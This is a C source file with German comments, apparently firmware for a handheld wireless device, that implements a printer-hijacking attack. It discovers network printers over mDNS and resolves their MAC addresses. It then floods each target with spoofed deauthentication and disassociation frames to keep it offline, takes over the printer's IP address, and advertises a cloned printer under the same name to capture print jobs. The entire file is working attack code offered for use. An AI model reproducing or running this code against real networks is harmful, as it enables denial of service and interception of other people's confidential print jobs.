/* Printer-Hijack "Weg A": siehe wlan_printhijack.h.
 * - mDNS-Scan nach _ipp._tcp (IP = Absender der Antwort, angelehnt an
 *   streaming/airplay_mdns.c) + ARP-Auflösung der WiFi-MAC (für Deauth).
 * - Hijack: mDNS-Clone des Zieldruckernamens auf dieses Gerät (wlan_airprint,
 *   eigene IP bleibt) + gezielter Deauth der Drucker-MAC (auf dem aktuellen
 *   Kanal, ohne die eigene STA zu trennen). */

#include "wlan_printhijack.h"
#include "wlan_airprint.h"

#include <wlan_hal.h>
#include <furi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <string.h>
#include <stdlib.h>

#include <lwip/sockets.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <lwip/tcpip.h>
#include <esp_netif.h>

#define TAG "PrintHijack"

#define MDNS_PORT   5353
#define MDNS_ADDR_BE {224, 0, 0, 251}
#define DNS_T_PTR   12
#define DNS_T_SRV   33
#define RECV_BUF_SZ 1500

/* ── mDNS-Scan (_ipp._tcp) ──────────────────────────────────────────────── */
static inline uint16_t nbo16(uint16_t x) {
    return (uint16_t)((x >> 8) | (x << 8));
}

static int dns_read_name(const uint8_t* pkt, int len, int pos, char* out, int outsz) {
    int outlen = 0, jumped = 0, next = -1, hops = 0;
    while(pos >= 0 && pos < len) {
        uint8_t l = pkt[pos];
        if((l & 0xC0) == 0xC0) {
            if(pos + 1 >= len) return -1;
            int ptr = ((l & 0x3F) << 8) | pkt[pos + 1];
            if(!jumped) next = pos + 2;
            jumped = 1;
            pos = ptr;
            if(++hops > 32) return -1;
            continue;
        } else if(l == 0) {
            if(!jumped) next = pos + 1;
            break;
        } else {
            pos++;
            if(pos + l > len) return -1;
            if(outlen && outlen < outsz - 1) out[outlen++] = '.';
            for(int i = 0; i < l; i++) {
                if(outlen < outsz - 1) out[outlen++] = (char)pkt[pos + i];
            }
            pos += l;
        }
    }
    out[(outlen < outsz) ? outlen : (outsz - 1)] = '\0';
    return next;
}

static void extract_name(const char* fqdn, char* out, int outsz) {
    char inst[128];
    strncpy(inst, fqdn, sizeof(inst) - 1);
    inst[sizeof(inst) - 1] = '\0';
    char* svc = strstr(inst, "._ipp");
    if(svc) *svc = '\0';
    strncpy(out, inst, outsz - 1);
    out[outsz - 1] = '\0';
}

typedef struct {
    WlanPrinterEntry* out;
    int max;
    uint32_t timeout_ms;
    int count;
} ScanCtx;

static int find_or_add(ScanCtx* c, uint32_t ip) {
    for(int i = 0; i < c->count; i++) {
        if(c->out[i].ip == ip) return i;
    }
    if(c->count >= c->max) return -1;
    int idx = c->count++;
    memset(&c->out[idx], 0, sizeof(WlanPrinterEntry));
    c->out[idx].ip = ip;
    c->out[idx].port = 631;
    return idx;
}

static void build_query(uint8_t* buf, int* out_len) {
    int p = 0;
    buf[p++] = 0; buf[p++] = 0;
    buf[p++] = 0; buf[p++] = 0;
    buf[p++] = 0; buf[p++] = 1;
    buf[p++] = 0; buf[p++] = 0;
    buf[p++] = 0; buf[p++] = 0;
    buf[p++] = 0; buf[p++] = 0;
    static const char* labels[] = {"_ipp", "_tcp", "local"};
    for(int i = 0; i < 3; i++) {
        int ll = strlen(labels[i]);
        buf[p++] = (uint8_t)ll;
        memcpy(&buf[p], labels[i], ll);
        p += ll;
    }
    buf[p++] = 0;
    buf[p++] = 0; buf[p++] = DNS_T_PTR;
    buf[p++] = 0x80; buf[p++] = 0x01;
    *out_len = p;
}

static void parse_response(const uint8_t* pkt, int len, uint32_t src_ip, ScanCtx* c) {
    if(len < 12) return;
    int an = (pkt[6] << 8) | pkt[7];
    int ns = (pkt[8] << 8) | pkt[9];
    int ar = (pkt[10] << 8) | pkt[11];
    int total = an + ns + ar;
    int qd = (pkt[4] << 8) | pkt[5];
    int pos = 12;
    char name[128];
    for(int i = 0; i < qd; i++) {
        pos = dns_read_name(pkt, len, pos, name, sizeof(name));
        if(pos < 0 || pos + 4 > len) return;
        pos += 4;
    }
    for(int i = 0; i < total; i++) {
        pos = dns_read_name(pkt, len, pos, name, sizeof(name));
        if(pos < 0 || pos + 10 > len) return;
        int type = (pkt[pos] << 8) | pkt[pos + 1];
        int rdlen = (pkt[pos + 8] << 8) | pkt[pos + 9];
        int rdata = pos + 10;
        if(rdata + rdlen > len) return;

        if(type == DNS_T_SRV) {
            int idx = find_or_add(c, src_ip);
            if(idx >= 0 && rdlen >= 6) {
                c->out[idx].port = (pkt[rdata + 4] << 8) | pkt[rdata + 5];
                if(c->out[idx].name[0] == '\0')
                    extract_name(name, c->out[idx].name, WLAN_PRINTHIJACK_NAME_MAX);
            }
        } else if(type == DNS_T_PTR) {
            char inst[128];
            if(dns_read_name(pkt, len, rdata, inst, sizeof(inst)) > 0) {
                int idx = find_or_add(c, src_ip);
                if(idx >= 0 && c->out[idx].name[0] == '\0')
                    extract_name(inst, c->out[idx].name, WLAN_PRINTHIJACK_NAME_MAX);
            }
        }
        pos = rdata + rdlen;
    }
}

/* WiFi-MAC einer IP via ARP auflösen (für gezielten Deauth). */
static bool resolve_mac(uint32_t ip_nbo, uint8_t out[6]) {
    esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if(!sta) return false;
    struct netif* nif = (struct netif*)esp_netif_get_netif_impl(sta);
    if(!nif) return false;

    ip4_addr_t ip;
    ip.addr = ip_nbo;

    /* Traffic anstoßen, damit lwip die ARP-Auflösung startet. */
    int s = lwip_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s >= 0) {
        struct sockaddr_in d = {0};
        d.sin_family = AF_INET;
        d.sin_port = nbo16(9);
        d.sin_addr.s_addr = ip_nbo;
        uint8_t z = 0;
        lwip_sendto(s, &z, 1, 0, (struct sockaddr*)&d, sizeof(d));
        lwip_close(s);
    }

    for(int i = 0; i < 12; i++) {
        struct eth_addr* eth = NULL;
        const ip4_addr_t* ipr = NULL;
#if LWIP_TCPIP_CORE_LOCKING
        LOCK_TCPIP_CORE();
#endif
        int idx = etharp_find_addr(nif, &ip, &eth, &ipr);
        bool got = (idx >= 0 && eth);
        uint8_t tmp[6];
        if(got) memcpy(tmp, eth->addr, 6);
#if LWIP_TCPIP_CORE_LOCKING
        UNLOCK_TCPIP_CORE();
#endif
        if(got) {
            memcpy(out, tmp, 6);
            return true;
        }
        vTaskDelay(pdMS_TO_TICKS(60));
    }
    return false;
}

static void scan_worker(void* arg) {
    ScanCtx* c = arg;
    int s = lwip_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s < 0) return;

    uint32_t own_ip = wlan_hal_get_own_ip();
    struct sockaddr_in local = {0};
    local.sin_family = AF_INET;
    local.sin_port = 0;
    local.sin_addr.s_addr = own_ip;
    if(lwip_bind(s, (struct sockaddr*)&local, sizeof(local)) < 0) {
        lwip_close(s);
        return;
    }
    struct timeval tv = {.tv_sec = 0, .tv_usec = 200 * 1000};
    lwip_setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = nbo16(MDNS_PORT);
    uint8_t maddr[4] = MDNS_ADDR_BE;
    memcpy(&dst.sin_addr.s_addr, maddr, 4);

    uint8_t query[64];
    int qlen = 0;
    build_query(query, &qlen);
    lwip_sendto(s, query, qlen, 0, (struct sockaddr*)&dst, sizeof(dst));

    uint8_t* buf = malloc(RECV_BUF_SZ);
    if(!buf) {
        lwip_close(s);
        return;
    }
    uint32_t elapsed = 0;
    bool re_queried = false;
    while(elapsed < c->timeout_ms) {
        struct sockaddr_in src;
        socklen_t sl = sizeof(src);
        int n = lwip_recvfrom(s, buf, RECV_BUF_SZ, 0, (struct sockaddr*)&src, &sl);
        if(n > 0) parse_response(buf, n, src.sin_addr.s_addr, c);
        elapsed += 200;
        if(!re_queried && elapsed >= c->timeout_ms / 2) {
            lwip_sendto(s, query, qlen, 0, (struct sockaddr*)&dst, sizeof(dst));
            re_queried = true;
        }
    }
    free(buf);
    lwip_close(s);

    /* MACs auflösen (best effort). */
    for(int i = 0; i < c->count; i++) {
        c->out[i].has_mac = resolve_mac(c->out[i].ip, c->out[i].mac);
    }
    FURI_LOG_I(TAG, "scan done: %d printer(s)", c->count);
}

int wlan_printhijack_scan(WlanPrinterEntry* out, int max, uint32_t timeout_ms) {
    ScanCtx ctx = {.out = out, .max = max, .timeout_ms = timeout_ms, .count = 0};
    if(!wlan_hal_run_in_worker(scan_worker, &ctx)) return 0;
    return ctx.count;
}

/* ── Hijack: mDNS-Clone + gezielter Deauth ──────────────────────────────── */
static bool s_running = false;
static char s_own_ip[16];
static uint8_t s_printer_mac[6];
static bool s_has_mac = false;
static uint8_t s_ap_bssid[6];
static uint8_t s_ap_channel = 1;
static TaskHandle_t s_deauth_task = NULL;
static volatile bool s_deauth_run = false;
static esp_netif_ip_info_t s_saved_ip;
static bool s_ip_taken = false;

/* Deauth-Template (26 B) wie in scene_network_deauth.c. */
static const uint8_t s_deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* addr1 RA */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* addr2 TA */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* addr3 BSSID */
    0x00, 0x00, 0x02, 0x00,
};
static const uint8_t s_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};

static void deauth_task(void* arg) {
    (void)arg;
    /* Auf dem AP-Kanal bleiben (= unser Kanal) + Promiscuous für raw TX. Die
     * STA-Verbindung wird NICHT getrennt, damit der mDNS-Clone/IPP-Server
     * online bleibt. */
    wlan_hal_set_channel(s_ap_channel);
    wlan_hal_set_promiscuous(true, NULL);

    uint32_t cycle = 0;
    while(s_deauth_run) {
        uint8_t reason = s_reasons[cycle % sizeof(s_reasons)];
        uint8_t f[26];
        memcpy(f, s_deauth_tmpl, 26);
        memcpy(&f[4], s_printer_mac, 6); /* RA = Drucker */
        memcpy(&f[10], s_ap_bssid, 6); /* TA = AP */
        memcpy(&f[16], s_ap_bssid, 6); /* BSSID = AP */
        f[24] = reason;
        wlan_hal_raw_tx_retry(f, 26);
        f[0] = 0xa0; /* Disassoc */
        wlan_hal_raw_tx_retry(f, 26);
        cycle++;
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    wlan_hal_set_promiscuous(false, NULL);
    s_deauth_task = NULL;
    vTaskDelete(NULL);
}

bool wlan_printhijack_start(uint32_t ip, const char* name, const uint8_t* mac, bool has_mac) {
    if(s_running) return true;
    if(!wlan_hal_is_connected() || ip == 0) {
        FURI_LOG_E(TAG, "not connected / no target");
        return false;
    }

    s_has_mac = has_mac && mac;
    if(s_has_mac) memcpy(s_printer_mac, mac, 6);

    /* 1) Echten Drucker vom WLAN werfen (gezielter Deauth, ohne die eigene STA
     *    zu trennen). Nur mit bekannter MAC. Hält den Drucker offline → kein
     *    IP-Konflikt, und Clients müssen die IP neu per ARP auflösen (→ uns). */
    if(s_has_mac) {
        wifi_ap_record_t ap;
        if(wlan_hal_get_connected_ap(&ap)) {
            memcpy(s_ap_bssid, ap.bssid, 6);
            s_ap_channel = ap.primary ? ap.primary : 1;
            s_deauth_run = true;
            if(xTaskCreate(deauth_task, "PhijackDeauth", 3072, NULL, 5, &s_deauth_task) != pdPASS) {
                FURI_LOG_W(TAG, "deauth task failed");
                s_deauth_run = false;
            }
        } else {
            FURI_LOG_W(TAG, "no AP info, deauth skipped");
        }
    }

    /* 2) IP des Druckers übernehmen — NUR wenn wir ihn per Deauth offline halten
     *    (sonst IP-Konflikt = der alte, gescheiterte Weg B). Ohne MAC/Deauth
     *    bleiben wir auf unserer eigenen IP (reiner mDNS-Clone). */
    esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    uint32_t serve_ip;
    if(s_deauth_run && sta && esp_netif_get_ip_info(sta, &s_saved_ip) == ESP_OK) {
        esp_netif_dhcpc_stop(sta);
        esp_netif_ip_info_t ni = s_saved_ip; /* Netmask + GW behalten */
        ni.ip.addr = ip;
        if(esp_netif_set_ip_info(sta, &ni) == ESP_OK) {
            s_ip_taken = true;
            serve_ip = ip; /* wir bedienen jetzt die Drucker-IP */
        } else {
            FURI_LOG_W(TAG, "set_ip_info failed, staying on own IP");
            esp_netif_dhcpc_start(sta);
            serve_ip = wlan_hal_get_own_ip();
        }
    } else {
        serve_ip = wlan_hal_get_own_ip(); /* Clone-only auf eigener IP */
    }
    snprintf(s_own_ip, sizeof(s_own_ip), "%u.%u.%u.%u", (unsigned)(serve_ip & 0xFF),
             (unsigned)((serve_ip >> 8) & 0xFF), (unsigned)((serve_ip >> 16) & 0xFF),
             (unsigned)((serve_ip >> 24) & 0xFF));

    /* 3) IPP-Server + mDNS-Clone unter dem Namen des Zieldruckers. Die IP wurde
     *    oben ggf. schon auf die Drucker-IP gesetzt → mDNS-A-Record zeigt darauf. */
    if(!wlan_airprint_start_clone(name)) {
        FURI_LOG_E(TAG, "clone start failed");
        wlan_printhijack_stop();
        return false;
    }

    s_running = true;
    FURI_LOG_I(TAG, "hijack: '%s' serve_ip=%s deauth=%d ip_taken=%d", name, s_own_ip,
               (int)s_deauth_run, (int)s_ip_taken);
    return true;
}

void wlan_printhijack_stop(void) {
    if(s_deauth_run) {
        s_deauth_run = false;
        for(int i = 0; i < 20 && s_deauth_task; i++) vTaskDelay(pdMS_TO_TICKS(50));
    }
    if(wlan_airprint_is_running()) wlan_airprint_stop();

    /* eigene IP wiederherstellen (DHCP renew) */
    if(s_ip_taken) {
        esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        if(sta) {
            esp_netif_set_ip_info(sta, &s_saved_ip);
            esp_netif_dhcpc_start(sta);
        }
        s_ip_taken = false;
    }

    s_has_mac = false;
    s_running = false;
    FURI_LOG_I(TAG, "hijack stopped");
}

bool wlan_printhijack_is_running(void) {
    return s_running;
}

bool wlan_printhijack_get_ip(char* out, size_t len) {
    if(!out || len == 0) return false;
    strncpy(out, s_own_ip, len - 1);
    out[len - 1] = 0;
    return s_own_ip[0] != 0;
}
